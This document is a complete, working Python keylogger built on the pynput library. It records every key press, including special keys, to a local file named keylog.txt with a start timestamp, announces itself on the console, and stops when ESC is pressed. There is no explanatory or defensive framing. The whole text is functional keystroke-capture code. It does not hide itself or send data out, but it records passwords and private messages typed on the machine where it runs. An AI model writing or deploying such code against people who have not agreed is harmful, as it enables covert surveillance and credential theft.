from pynput import keyboard
import datetime

# Log file path
log_file = "keylog.txt"


def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(f"{key} ")


def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            write_to_file(key.char)
        else:
            write_to_file(f"[{key.name}]")
    except Exception as e:
        write_to_file(f"[Error: {e}]")


def on_release(key):
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False


print(f"Keylogger started... Press ESC to stop.")
with open(log_file, "a") as f:
    f.write(f"\n\n--- Keylogging started at {datetime.datetime.now()} ---\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
